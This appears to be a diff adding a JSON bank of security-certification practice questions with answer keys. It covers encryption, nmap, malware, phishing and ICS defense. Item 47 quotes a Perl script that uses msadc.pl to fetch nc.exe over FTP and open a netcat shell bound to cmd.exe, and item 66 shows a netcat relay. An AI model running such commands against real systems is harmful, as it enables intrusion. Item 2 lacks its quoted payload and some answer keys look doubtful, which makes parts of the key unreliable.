@@ -1,0 +1,3370 @@
+[
+  {
+    "id": 1,
+    "q": "In this form of encryption algorithm, every individual block contains 64-bit data, and three keys are used, where each key consists of 56 bits. Which is this encryption algorithm?",
+    "choices": [
+      "IDEA",
+      "Triple Data Encryption Standard",
+      "AES",
+      "MD5 encryption algorithm"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "examtopics"
+  },
+  {
+    "id": 2,
+    "q": "John is investigating web-application firewall logs and observers that someone is attempting to inject the following: What type of attack is this?",
+    "choices": [
+      "SQL injection",
+      "Buffer overflow",
+      "CSRF",
+      "XSS"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "examtopics"
+  },
+  {
+    "id": 3,
+    "q": "John, a professional hacker, performs a network attack on a renowned organization and gains unauthorized access to the target network. He remains in the network without being detected for a long time and obtains sensitive information without sabotaging the organization. Which of the following attack techniques is used by John?",
+    "choices": [
+      "Insider threat",
+      "Diversion theft",
+      "Spear-phishing sites",
+      "Advanced persistent threat"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "examtopics"
+  },
+  {
+    "id": 4,
+    "q": "You are attempting to run an Nmap port scan on a web server. Which of the following commands would result in a scan of common ports with the least amount of noise in order to evade IDS?",
+    "choices": [
+      "nmap -A - Pn",
+      "nmap -sP -p-65535 -T5",
+      "nmap -sT -O -T0",
+      "nmap -A --host-timeout 99 -T1"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "examtopics"
+  },
+  {
+    "id": 5,
+    "q": "This wireless security protocol allows 192-bit minimum-strength security protocols and cryptographic tools to protect sensitive data, such as GCMP-256, HMAC-SHA384, and ECDSA using a 384-bit elliptic curve. Which is this wireless security protocol?",
+    "choices": [
+      "WPA3-Personal",
+      "WPA3-Enterprise",
+      "WPA2-Enterprise",
+      "WPA2-Personal"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "examtopics"
+  },
+  {
+    "id": 6,
+    "q": "What are common files on a web server that can be misconfigured and provide useful information for a hacker such as verbose error messages?",
+    "choices": [
+      "httpd.conf",
+      "administration.config",
+      "php.ini",
+      "idq.dll"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "examtopics"
+  },
+  {
+    "id": 7,
+    "q": "Gerard, a disgruntled ex-employee of Sunglass IT Solutions, targets this organization to perform sophisticated attacks and bring down its reputation in the market. To launch the attacks process, he performed DNS footprinting to gather information about DNS servers and to identify the hosts connected in the target network. He used an automated tool that can retrieve information about DNS zone data including DNS domain names, computer names, IP addresses, DNS records, and network Whois records. He further exploited this information to launch other sophisticated attacks. What is the tool employed by Gerard in the above scenario?",
+    "choices": [
+      "Towelroot",
+      "Knative",
+      "zANTI",
+      "Bluto"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "examtopics"
+  },
+  {
+    "id": 8,
+    "q": "Tony is a penetration tester tasked with performing a penetration test. After gaining initial access to a target system, he finds a list of hashed passwords. Which of the following tools would not be useful for cracking the hashed passwords?",
+    "choices": [
+      "Hashcat",
+      "John the Ripper",
+      "THC-Hydra",
+      "netcat"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "examtopics"
+  },
+  {
+    "id": 9,
+    "q": "Which of the following Google advanced search operators helps an attacker in gathering information about websites that are similar to a specified target URL?",
+    "choices": [
+      "[inurl:]",
+      "[info:]",
+      "[site:]",
+      "[related:]"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "examtopics"
+  },
+  {
+    "id": 10,
+    "q": "You are a penetration tester working to test the user awareness of the employees of the client XYZ. You harvested two employees’ emails from some public sources and are creating a client-side backdoor to send it to the employees via email. Which stage of the cyber kill chain are you at?",
+    "choices": [
+      "Reconnaissance",
+      "Weaponization",
+      "Command and control",
+      "Exploitation"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "examtopics"
+  },
+  {
+    "id": 11,
+    "q": "Your network security manager wants to receive a monthly report detailing the security posture of all assets on the network (e.g., workstations, servers, routers, switches, firewalls). The report should identify any system or device missing a security patch, OS update, or other critical security feature, along with its risk severity. Which solution is best suited to gather this information?",
+    "choices": [
+      "Virus scan",
+      "Penetration test",
+      "Vulnerability scanner",
+      "Security policy"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 12,
+    "q": "You are analyzing a rule in your organization's Intrusion Detection System (IDS). You see the following output : \nalert tcp  \\$EXTERNAL_NET  \\$HTTP_PORTS -> \\$HOME_NET any\nmsg: \"BROWSER-IE Microsoft Internet Explorer CacheSize exploit attempt\";\nflow: to_client, established;\nfile_data;\n    content:\"recordset\"; offset:14; depth:9;\n    content:\".CacheSize\"; distance:0; within:100;\n    pcre:\"/CacheSize\\s*=\\s*/\";\n    byte_test:10,>,0x3fffffff,0,relative,string;\nmax-detect-ips drop, service http;\nreference:cve,2016-8077;\nclasstype: attempted-user;\nsid:65535; rev:1;\nBased on this rule, which of the following malicious packets would this IDS alert on ?",
+    "choices": [
+      "A malicious outbound TCP packet",
+      "Any malicious outbound packets",
+      "Any malicious inbound packets",
+      "A malicious inbound TCP packet"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 13,
+    "q": "What type of malicious application can replicate itself without requiring user interaction or relying on another application to act as a host?",
+    "choices": [
+      "Virus",
+      "Worm",
+      "Macro",
+      "Trojan"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 14,
+    "q": "A security engineer is working on Kali Linux and writing exploits in C++. What command should they use to compile their new exploit and name the output file notepad.exe?",
+    "choices": [
+      "g++ --compile -i exploit.cpp -o notepad.exe",
+      "g++ exploit.py -o notepad.exe",
+      "g++ exploit.cpp -o notepad.exe",
+      "g++ -i exploit.pl -o notepad.exe"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 15,
+    "q": "What type of scan measures the size or distance of a person's external features using a digital video camera?",
+    "choices": [
+      "Retinal scan",
+      "Signature kinetics scan",
+      "Iris scan",
+      "Facial recognition scan"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 16,
+    "q": "You are working as a penetration tester and have discovered a new method of exploiting a vulnerability in the Windows 10 operating system. After researching online, you find that no security patch currently exists for this vulnerability. What type of threat would this BEST be categorized as?",
+    "choices": [
+      "Brute force",
+      "Zero-day",
+      "DDoS",
+      "Spoofing"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 17,
+    "q": "A company has recently suffered a data breach, losing nearly 1 GB of personally identifiable customer information. You are part of the incident response team tasked with identifying how the data was exfiltrated. After a thorough investigation, the only significant outbound data transfer was from the email server. One user sent numerous large attachments to their personal email address, but the emails appear to contain only photos from a recent trip to Australia.\nWhat is the most likely explanation for how the data left the network?",
+    "choices": [
+      "The data was hashed and then emailed to their personal email account",
+      "The files were downloaded from home while connected to corporate VPN",
+      "The data was encrypted and emailed to their spouse's email account",
+      "Steganography was used to hide the leaked data inside this user's photos"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 18,
+    "q": "Which of the following is NOT considered part of the Internet of Things (IoT)",
+    "choices": [
+      "SCADA",
+      "ICS",
+      "Smart Television",
+      "Laptop"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 19,
+    "q": "Which of the following is NOT a reliable method for improving data validation and trust?",
+    "choices": [
+      "Implementing timestamps",
+      "Encrypting data in transit",
+      "Using MD5 checksums for files",
+      "Encrypting data at rest"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 20,
+    "q": "Praveen is currently investigating suspicious activity from an attacker who compromised a host on the network. The individual appears to have used credentials belonging to a janitor. After breaching the system, the attacker entered some unrecognized commands with very long text strings and then began using the sudo command to carry out actions.\nWhat type of attack has most likely occurred?",
+    "choices": [
+      "Phishing",
+      "Social engineering",
+      "Session hijacking",
+      "Privilege escalation"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 21,
+    "q": "You are conducting threat hunting for an online retailer. Upon analyzing their web server, you identified that a single HTML response returned as 45 MB in size, but an average response is normally only 275 KB. Which of the following categories of potential indicators of compromise would you classify this as?",
+    "choices": [
+      "Unauthenticated privilege",
+      "Data exfiltration",
+      "Beaconing",
+      "Introduction of new accounts"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 22,
+    "q": "Which of the protocols listed is NOT likely to trigger a vulnerability scan alert when used to support a virtual private network (VPN)",
+    "choices": [
+      "IPSec",
+      "PPTP",
+      "SSLv3",
+      "SSLv2"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 23,
+    "q": "A cybersecurity analyst is conducting a port scan of 192.168.1.45 using nmap. During the scan, the analyst found numerous ports open, and nmap could not determine the Operating System version of the system installed on 192.168.1.45. The analyst asks you to look over the results of their nmap scan results:\nStarting NMAP 7.80 ( https://nmap.org ) at 2020-06-12 21:23:15  \nNMAP scan report for 192.168.1.45  \nHost is up (0.78s latency).  \nNot shown: 992 closed ports  \nPORT     STATE SERVICE  \n21/tcp   open ftp  \n22/tcp   open ssh  \n25/tcp   open smtp  \n80/tcp   open http  \n139/tcp  open netbios-ssn    \n445/tcp  open microsoft-ds  \n515/tcp  open  \n631/tcp  open ipp  \n9100/tcp open  \n\nMAC Address: BC:92:6B:A5:B6:D8\n\nWhich of the following operating systems is most likely used by the host?",
+    "choices": [
+      "Windows workstation",
+      "Linux server",
+      "Windows server",
+      "Networked printer"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 24,
+    "q": "Which of the following exploitation frameworks contains plugins that can trigger buffer overflows in SCADA systems, such as exploit/windows/scada/daq_factory_bof that can trigger a stack overflow by sending excessive requests to a service port on the system?",
+    "choices": [
+      "Nessus",
+      "Metasploit",
+      "Armitron",
+      "Nato"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 25,
+    "q": "If you want to conduct an operating system identification during a nmap scan, which syntax should you utilize?",
+    "choices": [
+      "nmap -id",
+      "nmap -O",
+      "nmap -osscan",
+      "nmap -os"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 26,
+    "q": "Which of the following types of attacks occurs when an attacker attempts to gain confidential information or login credentials by sending targeted emails to a specific set of recipients within an organization?",
+    "choices": [
+      "Spear phishing",
+      "Phishing",
+      "Spoofing",
+      "Zero-day"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 27,
+    "q": "You have been asked to add an entry to your DNS records to allow SMTP traffic to be sent out using your domain name. Which type of record should you add to your DNS record?",
+    "choices": [
+      "CNAME",
+      "AAAA",
+      "A",
+      "MX"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 28,
+    "q": "Which of the following ports is used by LDAP by default?",
+    "choices": [
+      "417",
+      "389",
+      "3389",
+      "53"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 29,
+    "q": "While investigating a data breach, you discover that the account credentials used belonged to an employee who was fired several months ago for misusing company IT systems. Apparently, the IT department never deactivated the employee's account upon their termination. Which of the following categories would this breach be classified as?",
+    "choices": [
+      "Advanced persistent threat",
+      "Zero-day",
+      "Insider Threat",
+      "Known threat"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 30,
+    "q": "Tony works for a company as a cybersecurity analyst. His company runs a website that allows public postings. Recently, users have started complaining about the website having pop-up messages asking for their usernames and passwords. Simultaneously, your security team has noticed a large increase in the number of compromised user accounts on the system. What type of attack is most likely the cause of both of these events?",
+    "choices": [
+      "Rootkit",
+      "Cross-site scripting",
+      "SQL injection",
+      "Cross-site request forgery"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 31,
+    "q": "What techniques are commonly used by port and vulnerability scanners to identify the services running on a target system?",
+    "choices": [
+      "Using the -O option in nmap and UDP response timing",
+      "Comparing response fingerprints and registry scanning",
+      "Banner grabbing and comparing response fingerprints",
+      "Banner grabbing and UDP response timing"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 32,
+    "q": "A company needs to implement stronger authentication by adding an authentication factor to its wireless system. The wireless system only supports WPA with pre-shared keys, but the backend authentication system supports EAP and TLS. What should the network administrator implement?",
+    "choices": [
+      "WPA2 with a complex shared key",
+      "802.1x using EAP with MSCHAPv2",
+      "PKI with user authentication",
+      "MAC address filtering with IP filtering"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 33,
+    "q": "Lamont is in the process of debugging a software program. As he examines the code, he discovers that it is miswritten. Due to this error, the code does not validate a variable's size before allowing the information to be written into memory. Based on Lamont's discovery, what type of attack might occur?",
+    "choices": [
+      "Cross-site scripting",
+      "SQL injection",
+      "Buffer overflow",
+      "Malicious logic"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 34,
+    "q": "Which of the following types of digital forensic investigations is most challenging due to the on-demand nature of the analyzed assets?",
+    "choices": [
+      "Mobile devices",
+      "Cloud services",
+      "On-premises servers",
+      "Employee workstations"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 35,
+    "q": "During a business trip, Bobby connects to the hotel's wireless network to send emails to some of his clients. The next day, Bobby notices that additional emails have been sent out from his account without consent. Which of the following protocols was MOST likely used to compromise Bobby's email password utilizing a network sniffer?",
+    "choices": [
+      "DNS",
+      "TFTP",
+      "HTTP",
+      "SSL"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 36,
+    "q": "Which of the following is NOT a valid reason to conduct reverse engineering",
+    "choices": [
+      "To commit industrial espionage",
+      "To determine how a piece of malware operates",
+      "To allow an attacker to spot vulnerabilities in an executable",
+      "To allow the software developer to spot flaws in their source code"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 37,
+    "q": "What should a vulnerability report include if a cybersecurity analyst wants to reflect the assets scanned accurately?",
+    "choices": [
+      "Organizational governance",
+      "Virtual hosts",
+      "Log disposition",
+      "Processes utilization"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 38,
+    "q": "A web developer wants to protect their new web application from a man-in-the-middle attack. Which of the following controls would best prevent an attacker from stealing tokens stored in cookies",
+    "choices": [
+      "Hashing the cookie value",
+      "Forcing the use of TLS for the web application",
+      "Forcing the use of SSL for the web application",
+      "Setting the secure attribute on the cookie"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 39,
+    "q": "An ethical hacker has been hired to conduct a physical penetration test at a company. During the first day of the test, the ethical hacker dresses up like a plumber and waits in the building's main lobby until an employee goes through the main turnstile. As soon as the employee enters their access number and proceeds to go through the turnstile, the ethical hacker follows them through the access gate. What type of attack did the ethical hacker utilize to access the restricted area of the building",
+    "choices": [
+      "Tailgating",
+      "Social engineering",
+      "Malware",
+      "Shoulder surfing"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 40,
+    "q": "A factory worker suspects that a legacy workstation is infected with malware. The workstation runs Windows XP and is used as part of an ICS/SCADA system to control industrial factory equipment. The workstation is connected to an isolated network that does not have Internet. The workstation receives the pattern for the manufactured designs through a USB drive. A technician is dispatched to remove the malware from this workstation. After its removal, the technician provides the factory worker with a new USB drive to move the pattern files to the workstation. Within a few days, the factory worker contacts the technician again to report that the workstation appears to be re-infected with malware. Which of the following steps did the technician MOST likely forget to perform to prevent reinfection",
+    "choices": [
+      "Enable System Restore and create restore point (in Windows)",
+      "Quarantine the infected system",
+      "Update the anti-malware solution",
+      "identify and research malware symptoms",
+      "Disable System Restore (in Windows)",
+      "Re-mediate the infected systems"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 41,
+    "q": "You are working as a network administrator and are worried about the possibility of an insider threat. You want to enable a security feature that would remember the Layer 2 address first connected to a particular switch port to prevent someone from unplugging a workstation from the switch port and connecting their own laptop to that same switch port. Which of the following security features would BEST accomplish this goal",
+    "choices": [
+      "ACL",
+      "Sticky MAC",
+      "802.1x",
+      "NAC"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 42,
+    "q": "The local electric power plant contains both business networks and ICS/SCADA networks to control their equipment. Which technology should the power plant's security administrators look to implement first as part of configuring better defenses for the ICS/SCADA systems",
+    "choices": [
+      "Automated patch deployment",
+      "Intrusion prevention system",
+      "Antivirus software",
+      "Log consolidation"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 43,
+    "q": "Which of the following is the leading cause for cross-site scripting, SQL injection, and XML injection attacks",
+    "choices": [
+      "Output encoding",
+      "Directory traversal",
+      "File inclusions",
+      "Faulty input validation"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 44,
+    "q": "You are working for a government contractor who requires all users to use an PIV device when sending digitally signed and encrypted emails. Which of the following physical security measures is being implemented",
+    "choices": [
+      "Smart card",
+      "Cable lock",
+      "Biometric reader",
+      "Key fob"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 45,
+    "q": "What should administrators perform to reduce a system's attack surface and remove unnecessary software, services, and insecure configuration settings?",
+    "choices": [
+      "Hardening",
+      "Harvesting",
+      "Snarfing",
+      "Windowing"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 46,
+    "q": "An attacker was able to gain access to your organization's network closet while posing as an HVAC technician. While he was there, he installed a network sniffer in your switched network environment. The attacker now wants to sniff all of the packets in the network. Which attack should he use",
+    "choices": [
+      "Tear Drop",
+      "Fraggle",
+      "Smurf",
+      "MAC Flood"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 47,
+    "q": "A penetration tester discovered a web server running IIS 4.0 during their enumeration phase. The tester decided to use the msadc.pl attack script to execute arbitrary commands on the webserver. While the msadc.pl script is effective, and the pentester found it too monotonous to perform extended functions. During further research, the penetration tester found a perl script that runs the following msadc commands:\nsystem(\"perl msadc.pl -h \\$host -C \\\"echo \\$user>>tempfile\\\"\");\nsystem(\"perl msadc.pl -h \\$host -C \\\"echo \\$pass>>tempfile\\\"\");\nsystem(\"perl msadc.pl -h \\$host -C \\\"echo bin>>tempfile\\\"\");\nsystem(\"perl msadc.pl -h \\$host -C \\\"echo get nc.exe>>tempfile\\\"\");\nsystem(\"perl msadc.pl -h \\$host -C \\\"echo get hacked.html>>tempfile\\\"\");\n(\"perl msadc.pl -h \\$host -C \\\"echo quit>>tempfile\\\"\");\nsystem(\"perl msadc.pl -h \\$host -C \\\"ftp \\-s\\:tempfile\\\"\");\n$o=; print \"Opening FTP connection...\\n\";\nsystem(\"perl msadc.pl -h \\$host -C \\\"nc -l -p \\$port -e cmd.exe\\\"\"); \nWhich exploit base is indicated by this script?",
+    "choices": [
+      "Buffer overflow exploit",
+      "SQL injection exploit",
+      "Chained exploit",
+      "Denial of Service exploit"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 48,
+    "q": "Frank and John have started a secret club together. They want to ensure that when they send messages to each other, they are truly unbreakable. What encryption key would provide the STRONGEST and MOST secure option",
+    "choices": [
+      "Randomized one-time use pad",
+      "ECC with a 256-bit key",
+      "DES with a 56-bit key",
+      "AES with a 256-bit key"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 49,
+    "q": "You are developing your vulnerability scanning plan and attempting to scope your scans properly. You have decided to focus on the criticality of a system to the organization's operations when prioritizing the systems in the scope of your scans. Which of the following would be the best place to gather the criticality of a system",
+    "choices": [
+      "Ask the CEO for a list of all critical systems",
+      "Conduct a nmap scan of the network to determine the OS of each system",
+      "Scope the scan based on IP addresses",
+      "Review the asset inventory and BCP"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 50,
+    "q": "Which of the following cryptographic algorithms is classified as asymmetric",
+    "choices": [
+      "RC4",
+      "AES",
+      "Blowfish",
+      "Diffie-Hellman"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 51,
+    "q": "Which of the following identity and access management controls relies upon using a certificate-based authentication mechanism?",
+    "choices": [
+      "HOTP",
+      "TOTP",
+      "Smart card",
+      "Proximity card"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 52,
+    "q": "A cybersecurity analyst is applying for a new job with a penetration testing firm. He received the job application as a secured Adobe PDF file, but unfortunately, the firm locked the file with a password so the potential employee cannot fill in the application. Instead of asking for an unlocked copy of the document, the analyst decides to write a script in Python to attempt to unlock the PDF file by using passwords from a list of commonly used passwords until he can find the correct password or attempts every password in his list. Based on this description, what kind of cryptographic attack did the analyst perform?",
+    "choices": [
+      "Man-in-the-middle attack",
+      "Brute-force attack",
+      "Session hijacking",
+      "Dictionary attack"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 53,
+    "q": "You are conducting a physical penetration test against an organization. You followed an employee to the coffee shop next door, and while they were ordering, you got within 1 foot of them to electronically capture their proximity badge. Which of the following exploits are you planning to use?",
+    "choices": [
+      "Bluesnarfing",
+      "Session hijacking",
+      "Credential harvesting",
+      "RFID cloning"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 54,
+    "q": "A hacker successfully modified the sale price of items purchased through your company’s web site. During the investigation that followed, the security analyst has verified the web server and the Oracle database was not compromised directly. The analyst also found no attacks that could have caused this during their log verification of the Intrusion Detection System (IDS). What is the most likely method that the attacker used to change the items sale price.",
+    "choices": [
+      "Cross-site scripting",
+      "SQL injection",
+      "Buffer overflow attack",
+      "Changing hidden form values"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 55,
+    "q": "What type of technique does exploit chaining often implement",
+    "choices": [
+      "Injecting parameters into a connection string using semicolons as a separator",
+      "Setting a user’s session identifier (SID) to an explicit known value",
+      "Inserting malicious JavaScript code into input parameters",
+      "Adding multiple parameters with the same name in HTTP requests"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 56,
+    "q": "A new piece of malware attempts to exfiltrate user data by hiding the traffic and sending it over a TLS-encrypted outbound traffic over random ports. What technology would be able to detect and block this type of traffic?",
+    "choices": [
+      "Intrusion detection system",
+      "Stateless packet inspection",
+      "Application-aware firewall",
+      "Stateful packet inspection"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 57,
+    "q": "What is not an example of a type of support resource that a penetration tester might receive as part of a white box assessment",
+    "choices": [
+      "Network diagrams",
+      "PII of employees",
+      "SOAP project files",
+      "XSD"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 58,
+    "q": "A penetration tester has exploited an FTP server using Metasploit and now wants to pivot to the organization’s LAN. What is the best method for the penetration tester to use to conduct the pivot",
+    "choices": [
+      "Set the payload to propagate through meterpreter",
+      "Create a route statement in meterpreter",
+      "Reconfigure the network settings in meterpreter",
+      "Issue the pivot exploit and setup meterpreter"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 59,
+    "q": "After analyzing and correlating activity from the firewall logs, server logs, and the intrusion detection system logs, a cybersecurity analyst has determined that a sophisticated breach of the company’s network security may have occurred from a group of specialized attackers in a foreign country over the past few months. Up until now, these cyberattacks against the company network had gone unnoticed by the company’s information security team. How would you best classify this threat",
+    "choices": [
+      "Insider threat",
+      "Spear phishing",
+      "Privilege escalation",
+      "Advanced persistent threat (APT)"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 60,
+    "q": "Which of the following provides a cryptographic authentication mechanism to positively identify an organization as the authorized sender of email for a particular domain name",
+    "choices": [
+      "DKIM",
+      "STARTP",
+      "SPF",
+      "DMARC"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 61,
+    "q": "Which of the following is the LEAST secure wireless security and encryption protocol",
+    "choices": [
+      "WPA2",
+      "WPA",
+      "WEP",
+      "AES"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 62,
+    "q": "An attacker is searching in Google for Cisco VPN configuration files by using the filetype:pcf modifier. The attacker could locate several of these configuration files and now wants to decode any connectivity passwords that they might contain. What tool should the attacker use",
+    "choices": [
+      "Nessus",
+      "Cain and Abel",
+      "Netcat",
+      "Nmap"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 63,
+    "q": "You have determined that your client uses several networked devices that rely on an embedded operating system during your reconnaissance. Which of the following methods would MOST likely be the best method for exploiting these",
+    "choices": [
+      "Use web-based exploits against the devices web interfaces",
+      "Use a spearphishing campaign to trick a user into installing a RAT",
+      "Use social engineering to trick a user into opening a malicious APK",
+      "Identify a jailbroken device for easy exploitation"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 64,
+    "q": "What common technique is used by malicious individuals to perform a man-in-the-middle attack on a wireless network",
+    "choices": [
+      "Session hijacking",
+      "Creating an evil twin",
+      "Amplified DNS attacks",
+      "ARP cache poisoning"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 65,
+    "q": "Your organization has been receiving many phishing emails recently, and you are trying to determine why they are effective at getting your users to click on their links. The latest email consists of what looks like an advertisement that is offering an exclusive early access opportunity to buy a new iPhone at a discounted price. Still, there are only 5 phones available at this price. What type of social engineering principle is being exploited here",
+    "choices": [
+      "Trust",
+      "Intimidation",
+      "Scarcity",
+      "Familiarity"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 66,
+    "q": "An attacker has issued the following command: nc -l -p 8080 | nc 192.168.1.76 443. Based on this command, what will occur",
+    "choices": [
+      "Netcat will listen for a connection from 192.168.1.76 on port 443 and output anything received to port 8080",
+      "Netcat will listen on the 192.168.1.76 interface for 443 seconds on port 8080",
+      "Netcat will listen on port 8080 and then output anything received to local interface 192.168.1.76",
+      "Netcat will listen on port 8080 and output anything received to a remote connection on 192.168.1.76 port 443"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 67,
+    "q": "What remediation strategies are the MOST effective in reducing the risk to an embedded ICS from a network-based compromise? (Select TWO)",
+    "choices": [
+      "Disabling unused services",
+      "NIDS",
+      "Segmentation",
+      "Patching"
+    ],
+    "correct": [
+      0,
+      2
+    ],
+    "multi": true,
+    "source": "trainer"
+  },
+  {
+    "id": 68,
+    "q": "What control provides the best protection against both SQL injection and cross-site scripting attacks",
+    "choices": [
+      "CSRF",
+      "Network layer firewalls",
+      "Hypervisors",
+      "Input validation"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 69,
+    "q": "What technique is an attacker using if they review data and publicly available information to gather intelligence about the target organization without scanning or other technical information-gathering activities",
+    "choices": [
+      "Passive reconnaissance",
+      "Patch management",
+      "Active scanning",
+      "Vulnerability scanning"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 70,
+    "q": "As part of the reconnaissance stage of a penetration test, Kumar wants to retrieve information about an organization’s network infrastructure without causing an IPS alert. Which of the following is the best course of action",
+    "choices": [
+      "Perform a DNS zone transfer",
+      "Use a nmap stealth scan",
+      "Perform a DNS brute-force attack",
+      "Use a nmap ping sweep"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 71,
+    "q": "Which of the following weaknesses exist in WPS enabled wireless networks",
+    "choices": [
+      "Utilizes TKIP to secure the authentication handshake",
+      "Utilizes a 24-bit initialization vector",
+      "Brute force occurs within 11,000 combinations",
+      "Utilizes a 40-bit encryption key"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 72,
